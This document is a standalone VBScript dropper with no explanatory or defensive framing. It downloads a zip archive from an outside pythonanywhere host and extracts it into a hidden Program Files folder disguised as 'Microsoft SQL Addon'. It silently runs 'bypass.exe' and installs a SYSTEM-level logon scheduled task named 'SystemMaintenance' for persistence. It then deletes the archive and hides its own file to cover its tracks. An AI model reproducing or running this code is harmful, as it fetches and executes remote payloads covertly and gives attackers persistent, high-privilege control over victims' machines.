On Error Resume Next
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")

temp = objShell.ExpandEnvironmentStrings("%TEMP%")
programFiles = objShell.ExpandEnvironmentStrings("%ProgramFiles%")

zipUrl = "https://bndevbeingexisted.pythonanywhere.com/download/BAM.zip"
zipPath = temp & "\BAM.zip"
newFolderPath = programFiles & "\Microsoft SQL Addon"

objHTTP.Open "GET", zipUrl, False
objHTTP.Send
If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile zipPath, 2
    objStream.Close
    objFSO.GetFile(zipPath).Attributes = objFSO.GetFile(zipPath).Attributes Or 2
End If

If Not objFSO.FolderExists(newFolderPath) Then
    Set newFolder = objFSO.CreateFolder(newFolderPath)
    newFolder.Attributes = newFolder.Attributes Or 2
End If

Set objZip = CreateObject("Shell.Application")
Set objFolder = objZip.NameSpace(zipPath)
If Not objFolder Is Nothing Then
    objZip.NameSpace(newFolderPath).CopyHere objFolder.Items, 16
End If

exePath = newFolderPath & "\bypass.exe"
If objFSO.FileExists(exePath) Then
    objFSO.GetFile(exePath).Attributes = objFSO.GetFile(exePath).Attributes Or 2
    objShell.Run exePath, 0, False

    taskName = "SystemMaintenance"
    taskCommand = "schtasks /create /tn """ & taskName & """ /tr """ & exePath & """ /sc onlogon /ru System /f /rl highest /it"
    objShell.Run taskCommand, 0, True

    If objFSO.FileExists(zipPath) Then
        objFSO.DeleteFile zipPath
    End If
End If

vbsPath = WScript.ScriptFullName
If objFSO.FileExists(vbsPath) Then
    objFSO.GetFile(vbsPath).Attributes = objFSO.GetFile(vbsPath).Attributes Or 2
End If
